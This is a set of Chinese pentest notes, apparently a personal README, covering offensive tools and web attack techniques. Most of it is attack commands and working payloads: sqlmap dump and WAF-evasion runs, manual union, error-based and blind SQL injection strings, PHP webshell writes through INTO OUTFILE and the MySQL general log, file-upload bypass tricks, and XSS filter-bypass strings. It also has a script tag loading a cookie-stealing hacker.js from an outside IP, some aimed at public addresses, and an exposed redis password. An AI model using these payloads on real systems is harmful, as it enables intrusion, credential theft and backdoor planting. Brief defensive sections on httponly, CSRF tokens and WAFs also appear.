# attack_tool

### 1.dirmap web目录扫描工具

https://github.com/H4ckForJob/dirmap

dirmap的安装指南

```git clone https://github.com/H4ckForJob/dirmap.git && 
cd dirmap
python3 -m pip install -r requirement.txt
python3 dirmap.py -i http://192.168.31.200 -lcf
```

dirmap的使用方法

```
python3 dirmap.py -i https://target.com -lcf
python3 dirmap.py -i 192.168.1.1 -lcf
python3 dirmap.py -i 192.168.1.0/24 -lcf
python3 dirmap.py -i 192.168.1.1-192.168.1.100 -lcf
python3 dirmap.py -iF targets.txt -lcf
```



### 2.子域名扫描

subdomainbrute与teemo的使用

```site:oldming.top -www
python subDomainsBrute.py oldming.top --full
python2 teemo.py --help
python2 teemo.py -d www.oldming.top
```



### 3.waf识别

shadon关键词搜索：X-Powered-By:WAF

```python main.py http://phw89.266933.com/```



### 4.EXP获取 POC

```
./searchsploit wordpress 4.1 搜索同时带有wordpress和4.1的漏洞
./searchsploit -s "wordpress 4.1" 更严格的搜索
./searchsploit "WordPress 4.1" -j 以json格式显示输出结果
./searchsploit "WordPress 4.1" -o 允许标题溢出其列
./searchsploit "WordPress 4.1" -p 显示漏洞的完整地址
./searchsploit "WordPress 4.1" -w 显示网络地址而非本地地址
./searchsploit "WordPress 4.1" -u 更新检查并安装任何数据库包更新
./searchexploit wordpress -c 区分大小写搜索
./searchsploit "Landa Driving School Management System 2.0.1 - Arbitrary File Upload" 
```



#### 5.pocsuite3获取poc

```
cd pocsuite && python cli.py -h
```



### 6.xray漏扫工具

```
/xray_darwin_arm64 webscan --listen 127.0.0.1:7777 --html-output proxy.html 被动扫描
/xray_darwin_arm64 webscan --url http://1.117.52.219:81/?a=b --html-output single-url.html  只扫描单个url
/xray_darwin_arm64 webscan --plugins cmd-injection,sqldet --url http://1.117.52.219:81/
/xray_darwin_arm64 webscan --plugins cmd-injection,sqldet --listen 127.0.0.1:7777
/xray_darwin_arm64 webscan --url http://example.com/?a=b \
--text-output result.txt --json-output result.json --html-output report.html  输出文件./xray_darwin_arm64 webscan --listen 127.0.0.1:7777 --html-output proxy.html 
并且浏览器配置代理后，用浏览器访问有漏洞的网站时就会自动扫描其中的漏洞
./xray_darwin_arm64 webscan --basic-crawler http://1.117.52.219:81/ --html-output vuln.html 爬虫主动
```

web漏洞扫描和验证工具: https://github.com/zhzyker/vulmap
`python3 vulmap.py -u http://192.168.31.105:8081`



### 7.proxy_pool 爬虫代理池技术

https://github.com/jhao104/proxy_pool.git

需要先开启一个有秘密的redis服务，并且在设置中链接此redis

###### Linux 

```
python proxyPool.py schedule 
python proxyPool.py server
pip3 install -r requirements.txt
```

###### Mac

```
git clone https://github.com/jhao104/proxy_pool.git 
python3 -m pip install -r requirement.txt
brew services start redis

redis-cli
config set requirepass chentuo0
config get requirepass
auth test123

other:    redis-cli -p 6379 -a chentuo0  && auth chentuo0
vim setting.py
python proxyPool.py schedule  
pip3 install --upgrade Werkzeug==0.15.5
python proxyPool.py server http://127.0.0.1:5010/get/
```

获取到代理池中的代理

```print(requests.get("http://127.0.0.1:5010/get/").json().get("proxy"))```



### 8.nosqlattack 攻击nosql数据库

环境准备

```
pip2 install  CouchDB==1.0 httplib2 ipcalc==1.1.3 pbkdf2==1.3 shodan==1.5.3  pymongo==2.7.2 nose tornado
sudo python2.7 setup.py install
sudo python2.7 setup.py install
```

注入测试

```
python2 main.py
2-1:http://192.168.31.200 
2-3:/sqlilabs/Less-1/?id=1 
x-4 开始注入
```



### 9.常见高危端口

21/22/69	ftp/tftp：文件传输协议	爆破 嗅探 溢出；后门  
22	ssh：远程连接	爆破 OpenSSH；28个退格  
23	telnet：远程连接	爆破 嗅探  
25	smtp：邮件服务	邮件伪造  
53	DNS：域名系统	DNS区域传输 DNS劫持DNS缓存投毒DNS欺骗 深度利用：利用DNS隧道技术刺透防火墙  
67/68	dhcp	劫持 欺骗  
110	pop3	爆破  
139	samba	爆破 未授权访问远程代码执行  
143	imap	爆破  
161	snmp	爆破  
389	ldap	注入攻击 未授权访问  
512/513/514	linux r	直接使用rlogin  
873	rsync	未授权访问  
1080	socket	爆破：进行内网渗透  
1352	lotus	爆破：弱口令 信息泄漏：源代码  
1433	mssql	爆破：使用系统用户登录 注入攻击  
1521	oracle	爆破：TNS 注入攻击  
2049	nfs	配置不当  
2181	zookeeper	未授权访问  
3306	mysql	爆破 拒绝服务注入  
3389	rdp	爆破 Shift后门  
4848	glassfish	爆破：控制台弱口令 认证绕过  
5000	sybase/DB2	爆破 注入  
5432	postgresql	缓冲区溢出 注入攻击爆破：弱口令  
5632	pcanywhere	拒绝服务 代码执行  
5900	vnc	爆破：弱口令 认证绕过  
6379	redis	未授权访问 爆破：弱口令  
7001	weblogic	Java反序列化 控制台弱口令控制台部署webshell  
80/443/8080	web	常见web攻击 控制台爆破对应服务器版本漏洞  
8069	zabbix	远程命令执行  
9090	websphere控制台	爆破：控制台弱口令 Java反序列  
9200/9300	elasticsearch	远程代码执行  
11211	memcacache	未授权访问  
27017	mongodb	爆破 未授权访问  



### 10.sqlmap使用方法(php5.4)

###### 常规注入流程

```
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --batch
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --dbs
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --privilege 查看权限
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --is-dba  查看是否是高权限用户
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -v 3 打印出了详细的payload
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --current-db
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 --tables
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin --columns
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump
```

###### 以post方式注入流程 

```
python sqlmap.py -r post_test.txt -p name --current-db
python sqlmap.py -r post_test.txt -p name -D note --tables
python sqlmap.py -r post_test.txt -p name -D note -T fl4g --columns
python sqlmap.py -r post_test.txt -p name -D note -T fl4g -C flag --dump
post_test.txt为需要post的数据包，-p为需要注入的参数的名字为name
```



###### 手工常规sqlmap注入的方法

```
?id='1 and 1=2
' union select 1,2,3--+
?id=' union select 1,database(),version()--+
?id=' union select 1,group_concat(schema_name),3 from information_schema.schemata--+
?id=' union select 1,table_name,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=' union select 1,column_name,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=' union select 1,group_concat(username),group_concat(password) from security.users--+
```



###### 防止查询时出现大量不在同一数据库中的重复属性：

```
?id=' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='pikachu'--+
```



###### sql注入读写文件的前提条件

show global variables like '%secure%';  没有具体值时，表示不对mysqld 的导入|导出做限制
修改mysql.ini /my.ini文件，在[mysqld] 下加入secure_file_priv =保存，重启mysql可改变默认的规则



###### sql注入读写文件

```
手工通过sql注入读写文件:
?id=' union select 1,2,'<?php phpinfo();?>' into outfile 'c:/Users/Ninja/Desktop/etc/phpstudy/www/p.php'--+
?id=' union select 1,2,load_file('c:/Users/Ninja/Desktop/etc/phpstudy/www/p.php')--+

sqlmap通过sql注入读写文件:
python sqlmap.py -u http://192.168.31.200/sqlilabs/Less-1/\?id\=1 --file-read 'c:/Users/Ninja/Desktop/etc/phpstudy/www/p.php'
cat /Users/chentuo/.local/share/sqlmap/output/192.168.31.200/files/c__Users_Ninja_Desktop_etc_phpstudy_www_p.php
python sqlmap.py -u http://192.168.31.200/sqlilabs/Less-1/\?id\=1 --file-write "/Users/chentuo/Public/tool/sqlmap_SQL注入工具/1.txt" --file-dest 'c:/Users/Ninja/Desktop/etc/phpstudy/www/2.txt'
```



###### 突破secure_file_priv 选项限制，通过日志来写入后门代码

```
show variables like 'general_log%';      查看日志状态（默认禁止）
show variables like 'general_log%';      
set global general_log = 'ON';   开启日志记录
set global slow_query_log=1;     
set global general_log_file="C:/Users/Ninja/Desktop/etc/phpstudy/www/1.txt";   伪造(修改)日志文件的绝对路径以及文件名
set global slow_query_log_file='C:/Users/Ninja/Desktop/etc/phpstudy/www/2.txt'; 
select '<?php phpinfo() ?>';   执行sql语句，mysql会将执行的语句内容记录到我们指定的文件中
select '<?php phpinfo() ?>' or sleep(11);    
show global variables like '%long_query_time%'; 命令执行时间超过long_query_time设定的值(默认10s)，则会保存至慢查询日志
```



###### 数据库权限对SQL注入的影响：

通过遗留的配置文件的内容判断当前数据库是root还是其他用户
如果是高权限用户，可以直接通过数据库进行文件的读写，将webshell写入，得到后门
如果是低权限用户，则需要将则只能进行读数据，找到后台地址，尝试在后台中写入后门



###### 其他数据库的注入方式

access数据库不存在文件读写，不存在记录数据库名的表，只有表，列，数据三层，也不存在跨步注入。
对access进行SQL测试时，需要去盲猜或者借助字典来跑，可以用sqlmap。即union select 1,2,3 from admin。后面的admin是盲猜的，根据回显结果继续下一步
跨步注入：不同的网站，享有了同一数据库。则可以根据某一个可以渗透进入得到敏感信息的数据库的网站，以跨步攻击的方式获取到无法注入其网站的后台数据。
对其他数据库如MSsql，postgresql,oracle等，原理通mysql一样，可以借助sqlmap工具来跑

对mogodb而言，可以手工注入和nosql进行攻击
构造回显:/new_list.php?id=1'}); return ({title:1,content:'2
爆库:/new_list.php?id=1'}); return ({title:tojson(db),content:'1
爆字段:/new_list.php?id=1'}); return ({title:tojson(db.Authority_confidential.find()[0]),content:'1  MD5在线解密即可 



###### 针对无回显注入:(盲注解决没有回显的问题)

1.报错盲注：

```
select报错盲注:
' or (select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ' 
' or updatexml(1,concat(0x7e,(version())),0) or '
' or extractvalue(1,concat(0x7e,database())) or '
update报错盲注:
' or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or '
' or updatexml(1,concat(0x7e,(version())),0) or '
' or extractvalue(1,concat(0x7e,database())) or' 
delete报错盲注：
?id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)
?id=56+or+updatexml+(1,concat(0x7e,database()),0)
?id=56+or+extractvalue(1,concat(0x7e,database()))
```

2.延时盲注:

```
and sleep( if(length(database())=8,5,0))--+ 判断位数
and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+ 
从1位置开始截取1位，利用ascii防止工具无法识别或者引号的转义，并且对开发比较友好
select * from users where id=1 and  if(ascii(substr((select  table_name  from  information_schema.tables  where  table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+ 查看所有数据库名
```

3.布尔盲注: ?id=1' and left(version(),3)=5.4--+
4.盲注无回显的问题：dnslog注入（需要高权限，可读写文件）



###### 借助sqlmap工具实现无回显盲注：

```
python sqlmap.py -u http://192.168.31.200/sqlilabs/Less-5/\?id\=1 --batch -technique E --proxy=http://127.0.0.1:8080 --user-agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/14.04.6 Chrome/81.0.3990.0 Safari/537.36" --cookie="id=1" --dbs
technique后面的参数表示过滤的类型，这里可以有选择性的选择是否启动代理，改变User-agent,cookie等
B : 基于Boolean的盲注（Boolean based blind）
Q : 内联查询（Inline queries）
T : 基于时间的盲注（time based blind）
U : 基于联合查询（Union query based）
E : 基于错误（error based）
如果需要绕过WAF，需要加tamper参数进行更精准的过滤
```



###### sqlmap借助tamper实现加密payload

```
python sqlmap.py -u http://192.168.31.200/sqlilabs/Less-9/\?id\=1 --proxy=http://127.0.0.1:8080 --user-agent="dog" --cookie="cat" --tamper=base64encode.py --batch --dbs
sqlmap实现cookie注入，即在cookie处加载payload，不断的发送数据包,注意ID=1放在了cookie中
python sqlmap.py -u http://192.168.31.200/sqlilabs/Less-9/index.php --proxy=http://127.0.0.1:8080 --random-agent --cookie="id=1" --batch --dbs --level 2
sqlmap实现在user-agent处进行测试，此时的useraget为“ID=1”，并且其前面无注入点，level为3
python sqlmap.py -u http://192.168.31.200/sqlilabs/Less-9/index.php --proxy=http://127.0.0.1:8080 --cookie="1" --user-agent='id=1' --batch --dbs --level 3
```



###### 二次注入产生的原理

在注册用户的时候，注入了一些敏感的数据，带入到了对方的数据库中；在修改数据的时候，从对方数据库里取出来这个敏感的数据，并且进行了执行.如输入了 admin'# 的用户，更新的时候将更新admin用户的密码，一般是配合白盒审计的时候才会用到这个

###### 堆叠查询的原理及利用价值：

?id=1';insert into users(id,username,password) values ('111','222','333');在原有的SQL语句上加上后，改变了数据库的结构
注入的时候需要管理员账号密码，密码是加密无法解密出来，堆叠注入进行插入数据，用户的密码是自定义的，可以正常登录，即是用重新添加的用户去管理mysql的后台账户



###### sqlmap绕过waf策略：

```
--user-agent="Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"  
模拟百度搜索引擎的爬虫
--delay 1 延迟时间去发送数据包达到绕过
--proxy="....."  利用代理池去访问
--tamper="space2morehash.py" 利用一些批处理脚本对payload先做修改之后在去访问
-r data.txt 通过抓取的数据包进行特定地方的伪造，如不常见的字段的伪造进行发包
python sqlmap.py -r 1.txt --proxy=http://127.0.0.1:8080 用自己的数据包发送数据,默认是get方式，也可以改为post注入
也可以通过php/python的中转脚本，sqlmap访问自己本地的网站，自己本地网站去访问远程的需要注入的网站
```



### 11.upload-labs

寻找上传漏洞的关键要素：
针对应用的功能下手，是否存在可以上传的地方
寻找其他已知的漏洞或者已知cms公开的漏洞进行利用
如nginx文件解析漏洞，将图片里边的后门文件给解析出来的，(nginx+php的用户配置不当的漏洞)
如Weblogic 任意文件上传漏洞（CVE-2018-2894）

###### 文件上传绕过思路：

```
前端绕过：前端js校验，抓包1.png修改为1.php
MIME绕过：抓包修改content-type为图片类型：image/jpeg、image/png、image/gif
php5绕过：抓包修改为1.php5上传，访问回复包里有上传路径

点+空格+点绕过：伪造为1.php. .来绕过
大小写绕过：伪造为6.PHp，并在重发器中获取文件上传地址
空格绕过：伪造为7.php ，并在重发器中获取文件上传地址
点绕过：伪造为8.php.

::$DATA绕过：伪造为9.php::DATA.
双写绕过：伪造为1.pphphp

图片马配合文件包含漏洞：将php代码插入到图片格式的文件中，直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞 http://1.117.52.219:81/upload-labs/include.php?file=upload/4720211213174512.png 被当成php解析

.htaccess绕过：先上传一个.htaccess文件，SetHandler application/x-httpd-php 这样所有文件都会当成php来解析。伪静态技术是指展示出来的是以html一类的静态页面形式，但其实是用ASP一类的动态脚本来处理的。
%00截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态，上传12.php%00 ，被解析为12.phpPOST不会像GET对%00进行自动解码，需要在二进制中进行修改。

文件头部信息绕过：不同格式后缀的图片用编辑器打开之后头几个字母不同，通过伪造文件的头部信息绕过文件类型校验
二次渲染配合条件竞争：文件到了服务器才进行的过滤是存在二次渲染问题的，配合条件竞争可以实现后门写入，文件存在的那一刹那，对文件进行重复访问，此时文件不会被重命名，php文件留下来了。而如果文件在上传之前就过滤了文件类型是没有任何问题的。

文件夹文件名字混用：提交1.jpg，保存为upload-19.php%00 并且改变hex编码，使%00为00253030，或提交upload-19.php/.
联合MIME与图片格式数组绕过：Content-Disposition: form-data; name="save_name[0]" upload-20.php   Content-Disposition: form-data; name="save_name[2]" jpg
寻找中间件的错误：如特定的nginx版本存在文件解析漏洞，可以利用这点直接上传图片马得到webshell权限
```



###### 几种常见的中间件的文件上传漏洞（需要特定版本+对方没有打过相应补丁，vulhub上可以复现）：

apache文件解析漏洞：

上传文件a.php.xxx被低版本的apche解析为a.php，黑名单可绕过，apche识别文件后缀，识别到xxx不执行，识别到php可执行，交给php来管理，php识别到了xxx无法识别，根据php的配置文件确定能否识别，一般只能识别php，php3，php4.php5，pht，phtml，而如果php的正则过滤没有被修改，则会被认为无法识别，显示出此文件的源码来

apache换行解析漏洞：

Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。

Nginx 解析漏洞：

上传一张带有php文本文件的图片后缀格式的文件，在满足这种漏洞的文件时，是会爆出php信息的，触发此漏洞的方法是在上传的图片马的地址的后边直接跟/xxxx.php当成php来访问。该与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。
-->判断有没有此漏洞，打开一个网站的一个图片的地址，在地址后边拼接/xx.php看效果，如果返回的是 错误则没有，如果返回乱码则是存在解析漏洞的，只需要找一个上传点就可以突破。

Nginx 文件名逻辑漏洞：

上传一个文件为1.gif的图片马，上传的时候伪造数据为1.gif 注意有空格，上传之后拿到真实地址进行访问的时候，伪造地址如下......./1.gif[0x20][0x00].php，其中0x表示十六进制编码
-->这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。



###### 实际应用中，如何判断文件上传漏洞：

首先通过字典扫描敏感目录，寻找可以上传文件的地址，或者手动寻找网站上类似会员中心的可以上传文件的地方
其次判断此网站的中间件类型及版本，对比是否有此版本可以利用的EXP，进行漏洞利用
或者通过实际的情况自己手工测试，绕过后台常见的保护机制，如黑白名单MIME文件内容，大小写绕过等等方法
根据网站给出的CMS或者其他编辑器，从CMS的漏洞或者编辑器的漏洞下手进行敏感文件上传
寻找网站上是否调用了一些其他的可以写入文件的三方服务，根据中间件的版本，寻找新的CVE漏洞进行测试



### 12.谷歌语法

###### 基本语法：

```
"program google"：默认搜索是and逻辑。输入关键字后进行搜索时.，结果包含“program”和“google”的文件内容。
"program OR google"：不确定要搜索的内容，或者想搜索两个中的任意一个，那么就要使用关键词“OR”。
"programgoogle"：不希望这两个单词之间有任何其他的内容，要使用双引号把搜索的内容组成一个词组。
"program -google"：只想看到“program”的内容，而不希望看到“google”的内容，就可以把“-”应用到搜索当中去。
"+www google"：常用的“www”和“the”，会被google自动忽略。不忽略这些词进行查询，在这些关键词的前面加“+”。
“"l*Messi"”：搜索“Lionel Messi”的内容，输入“"l*Messi"”进行查询，此处整个字符串是要用双引号括住的。
```



###### 高级语法：

```
“intitle:program moon”：将搜索的范围局限在标题上。在关键词前面加上这个，就会只对网页的标题进行搜索并且配对。
“allintitle:program moon”：搜索结果里关于program占据主导，想找到网页标题中既有program又有moon的网页用此变体。
“intext:2018 program”：是用来搜索网页正文内容的，这样就可以忽略网页中的超文本链接、URL和题目。
“allintext:2018 program”：结果中网页的正文既含有program这个关键词，又含有moon这个关键词。
“inanchor:login”：搜索含有锚点的网页，在页面的链接锚点进行搜索。这个语法也有一个变体“allinanchor:”。
链接锚点指的是一个链接的描述文本，如<a href=https://www.baidu.com>百度</a>，链接的锚点就是“百度”了。
“program site:google.com”：搜索的结果是包括所有含有google.com域名的有关内容。
“inurl:password”：显示所有URL中含有password的网页，搜索范围限制在URL或者网站页面，也有一个变体“allinurl:”。
“link:www.baidu.com”：会返回所有链接到百度主页的网页了，link这个的功能是查询所有链接到某个特定URL上的列表。
“cache:www.baidu.com”：查找到google索引过的页面副本，即使源文件界面不存在了，我们依然可以搜索的到。
“filetype:mdb”：结果就会显示出一些网站的数据库文件，filetype是指搜索指定后缀的文件。
“related:www.google.com”：显示的结果是一些其他的搜索引擎，可以辅助我们搜索同类的页面。
“info:www.google.com”：搜索到关于URL的更多信息的页面列表，包括这个网页的cache，还有与这个网页相似的网页。
```



### 13.xss跨站漏洞

###### xss漏洞的分类有哪些？

反射型：自己输入的东西在浏览器返回之后在页面中显示，将自己输入的东西换成js代码，浏览器会识别js代码并执行，由此形成了跨站漏洞。因为自己输入的是js代码，不再是一个字符串，浏览器会执行js代码的。

存储型：用户输入的东西存储在了对方的数据库中，攻击一直会持续到数据被删除为止。输入的js代码存储在了对方数据库并且反馈到了前端显示的js代码中，对方打开此页面的时候会触发自己插入的js代码。根据js代码，在对方登陆查看反馈信息的时候，执行了敏感的js代码，从而盗取对方的cookie，依据cookie登陆对方后台，从而通过beef连接。

DOM型：操作是在html静态语言中完成的，通过浏览器可以看到这个源代码。发包之后，先由本地浏览器的前端代码js进行操作，再去执行x.php。可以从代码的层面出分析出漏洞，而不是像其他两种需要多次去尝试才能发现。php动态编译，执行后的结果显示在前端的源代码与后端的实际代码是有很大差别的。html静态解释，在服务端和客户端的代码是一致的。



###### xss跨站漏洞主要产生在哪些地方？

留言板，评论区，反馈，订单信息等可以与管理员交互的地方。
体现在代码层面上主要是：php输出函数echo eval var_dump可能产生跨站漏洞，通过js代码实现xss跨站，
XSS通过在用户端注入恶意的可运行脚本，若服务器端对用户输入不进行处理，直接将用户输入输出到浏览器，则浏览器将会执行用户注入的脚本。



###### xss跨站的攻击条件有哪些？

对方网站有XSS跨站漏洞(累似留言板，或者在输入js代码有回显)，网站有没有拦截脚本的运行，有没有代码过滤或者http only
对方有没有登陆后台，对方浏览器有没有保存对方的cookie信息，对方管理员不去触发自己所搞的漏洞地址



###### 利用xss平台/自己写的代码/或者beef盗取cookie的原理是什么？

xss平台生成一个可以获取cookie的js代码，在一些可能产生XSS漏洞的地方输入此代码即XSS盲打，等待管理员执行，执行成功后，会将

管理员的cookie反弹至自己注册的xss平台
利用beef在搭建的时候会生成一个js代码，意味着别人触发这个js代码后会将对方浏览器的信息发至自己的服务器，这个beef是在内网中的，需要将其映射到外网，或者外网上搭建beef，beef还可诱导他人下载主机木马。
本地服务器写js脚本hacker.js，功能为获取用户cookie，保存信息至文件，有XSS漏洞的地方写入<script src="http://1.117.52.219/hacker.js"></script>



###### 如果盗取到的cookie的无法登陆后台，可能的原因是什么？

cookie无法登陆到后台的原因最有可能是此cookie信息不完整，对方可能不只是采用了cookie验证，也采用了session验证。
而session是存储在服务器的，不可能窃取到session，只能通过遗留在用户浏览器上的信息去获取，如phpinfo()，
想办法让对方触发phpinfo()，然后将这个信息的源码通过xss平台拿到，审查源码获取session，最终登陆到对方后台。



###### cookie与session的区别在哪里？

两者都是作为用户凭据的，用来验证用户的身份信息。
session：储存服务器，存活时间短 大型网站，也称为会话验证，如支付宝登陆之后，一段时间无操作之后需要重新登陆，比较安全，但会占用服务器资源，访问量大则对磁盘很浪费的，实现起来比cookie麻烦。
cookie：储存本地，存活时间长 小中型网站，如登陆网站，一段时间之后仍然可以登陆，不会占用服务器资源，小网站用这个。



###### 如何有效的防止xss漏洞？

httponly:防止通过js脚本获取cookie的信息，这样能够有效的阻止XSS的攻击，但是xss漏洞仍然是存在的。如何开启，对php而言，只需要在php.ini中引入或者在所需过滤的页面中相应过滤即可。
后台的进入：cookie登陆或者账号密码登陆 采用httponly后，限制了cookie的窃取，所以要采用账号密码登陆。
如果对方的浏览器会自动保存账号密码，可利用XSS读取账号密码的获取；如果没有保存的话，需要xss产生登陆地址，进行表单劫持。
此外，可以在有可能产生产生xss的地方加代码的限制，不论是输入还是输出都要进行过滤，还有开启http-only，以及部署waf等策略。



###### 如何用自动化的工具去测试xss？

通过xssstrike，自动过WAF，进行爆破，具体使用为python3 xssstrike.py -u http://192.168.31.200/xss-labs/?name=test --fuzzer
或者通过可以提供xss绕过waf的平台生成代码，依次将这些代码加入可能存在xss漏洞的地方进行测试
或者利用burp配合fuzz字典进行重发，测试能够绕过waf并且成功执行的xss语句。可以在本地搭建相同的环境之后拿到绕过payload，再来测试真实的网址。
常见的绕过waf的有标签语法替换，特殊符号干扰，提交方式更改，垃圾数据溢出，加密解密算法，结合其他漏洞绕过等



###### 如何手工的判断某个地方有没有跨站漏洞？

主要是在页面中输入的数据能够以js形式表示，并且数据包中完美闭合，形成js代码
通过URL地址或者数据包中的篡改，可以在页面中看到对应的参数，将显示的内容根据实际审查中的代码，实际的限制情况及过滤机制进行判断，
看能不能构成闭合的js代码，最后执行成可实现跨站语句的js代码获取对方的cookie的值



###### xss漏洞中可能会产生哪些代码过滤，如何绕过这些过滤？

```
观察发现name中的参数与页面反射的参数一致，尝试将js代码写入url参数中访问即 ?name=<script>alert(1)</script>
尝试分析审查代码，需要进行闭合"> 即 ?keyword="><script>alert(1)</script>
发现此地址会把>给过滤掉，尝试通过html的点击或者滑动实现  第一个引号闭合value ，onclick为了触发点击输入框触发事件，“alert触发弹框 ?keyword='%20onclick='alert(1)&submit=搜索

加引号闭合，加onclick进行点击，加弹框' onclick='alert(1) 即 ?keyword=%22%20onclick=%22alert(1)
过滤了on,即把on过滤为了o_n,过滤了事件，考虑用超链接的手段 链接到js脚本进行跳转 "><a href='javascript:alert(1)'>
过滤了script，on，src，data，href等 发现代码里边只有过滤到了相关字符，但是没有用正则表达式写，尝试用大小写过滤 ?

keyword=%20%22%3E%3Ca%20hRef=%27javascript:alert(1)%27%3E
过滤了大小写，并且也过滤了相关代码 但是此处只过滤了一次，没有多次过滤，类似pphphp的单词过滤，尝试加入二次绕过 ?keyword=%22%3E%3Ca%20hhrefref=%27javasscriptcript:alert(1)%27%3E

过滤了大小写及相关字符，一次绕过时因为不为空故不可二次绕过 尝试通过uncoide编码方式绕过，利用超级加解密转换工具 将javascript:alert(1)进行 编码转换，转为uncoide编码方式进行审查源码
有防止大小写绕过，特殊字符绕过，以及二次绕过 采用uncoide编码后仍然不能绕过，查看源码后发现必须保证http://的存在 前面利用编码绕过过滤的干扰，后边利用//过滤http://的干扰

输入框被隐藏，需要将输入框的类型变为可见 由源码可得，其中的t_sort为过滤><之后加入.干扰的结果 ?keyword=1&t_sort="type=''text"onclick="alert(1)"
输入框被隐藏，源代码中$str11=$_SERVER['HTTP_REFERER']; 更换数据包提交方式 勾选Referer 提交 " type=''text" onclick="alert(1)"
根据对方代码的接受方式选择数据包的伪造  User_agent: " type=''text" onclick="alert(1)"
```



### 14.csrf是什么？

###### CSRF漏洞 ：

跨站点请求伪造，与网站的逻辑相关，有没有检测数据包的合法性，有没有检测数据包的来源是是哪里
比如解惑某管理员添加用户的数据包，将此url地址放在自己网站的某个界面上，当管理员登陆状态访问自己网站时，不经意将触发了自己伪造的恶意数据包，自己可凭借此添加的用户密码登陆其后台。
a转账给其他人的数据包被b截获，b在自己的网站上伪造相同的数据包，并诱导a去访问自己的网站，此时a将不知不觉间给b某转账。



###### 怎么判断有没有csrf漏洞？

根据网站的功能点下手，一般出现在可以修改数据、添加管员或者更新数据的地方
可利用burp进行抓包并发送者enfiner-csrf中，将burp默认产生的html代码按自己的需求进行修改并放在自己的网站上
在登陆后台的情况下，点击此文件判断是否数据被篡改，如果用户数据被篡改则是存在csrf漏洞的
如何知道对方的数据包是需要在本地搭建同样的环境进行测试的



###### csrf的安全防御机制有哪些？

设置随机token：可以理解为数据包的唯一值，根据token来判断数据包是不是之前原始的，而不是别人构造的，有token认证的话一般就没有CSRF漏洞了，每次修改数据的token值都是唯一的
在别的网站里边则会出现不同的token值，则伪造失败，token是随机产生的非常长的一长串，无法进行爆破
也可以进行同源策略：检测referer的来源，在自己的网站上访问自己的某些地址时，数据包来源referer是自己
在自己的网站上访问别人的地址的时，referer会是其他不予执行，但是对方是检测同源的防御策略时，可以通过抓包修改次来源



### 15.ssrf是什么？

###### SSRF 服务器请求伪造(服务器接受远程地址改为服务器接受本地地址)

目标：从外网无法访问的内部系统，如果存在此漏洞可以读取其内网的相关信息
原因：由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过过滤和限制
挖掘：从WEB功能上找 分享，转码，在线翻译，图片加载与下载，收藏，未公开的api实现，或者从url参数上找



###### ssrf漏洞攻击说明？

输入一个远程的地址图片，对方来接受，对方需要对远程图片进行请求，将这个图片进行远程请求地址信息并保存到服务器端
那么也可以在上传图片的链接中填写http://127.0.0.1获取其服务信息，可以访问的内网服务http://192.168.31.200:22
所以ssrf实际上是借助服务器为跳板，去访问服务器才能访问的内网信息



###### ssrf利用的点有哪些？

端口扫描，指纹识别，漏洞利用，内网探针等
有这样的漏洞，可以去在漏洞产生的地方输入一个远程木马，将对方服务器在cs中上线，利用cs做后渗透攻击



### 15.RCE（代码及命令执行漏洞）是什么，怎么产生的？

在WEB应用中，程序员有时候为了考虑灵活、简洁性，会在代码调用代码或者命令执行函数去处理。
比如当一个应用调用一些能将字符串转化为代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码换行漏洞。
eval($_REQUEST['a'])代码执行漏洞 -->  漏洞产生后可以执行相关脚本代码，如读写文件等
eval(echo `$_REQUEST['a']`)命令执行漏洞--> 漏洞产生可以执行相关命令，如操作系统的命令，危害等级较大
echo `$_REQUEST['a']` --> 将代码执行漏洞升级变成了命令执行漏洞



###### 漏洞形成的条件有哪些？

可控变量(漏洞是否存在)，漏洞函数（漏洞形式）
eval字符串当作代码执行 system 字符串当作命令执行
漏洞函数时上传则为上传漏洞，是输出的则为XSS漏洞，为数据库查询则为SQL注入
如果一个网站单纯的展示新闻，没有扩展的接口可供查询，那么不会有此漏洞



###### 一般如何检测漏洞？

白盒：有源码，则就代码审计
黑盒：网站上的漏洞扫描工具awvs xray appscan，网上的公开漏洞，手工看参数值及功能点
有的url地址就可能会有echo等脚本执行代码或者加密后的脚本执行代码



###### RCE命令执行漏洞的利用：

抓包可以很简单的检查出对方所使用的操作系统，hackerbar发包时也可以根据自己的需要进行伪造
postman或者burpsuite进行数据的抓取与重发并修改提交至网站的代码
ping 127.0.0.1 | ls | pwd | whoami 会执行最后边的那条语句
cat表示正序输出文本，tac则表示反序输出文本
利用linux相关的基本命令读取出敏感信息



###### 如何防御RCE代码或者命令执行漏洞？

把echo ls cat tac过滤不现实，但可以固定变量，只执行某些变量
WAF部署，找一些收费的产品部署在上面
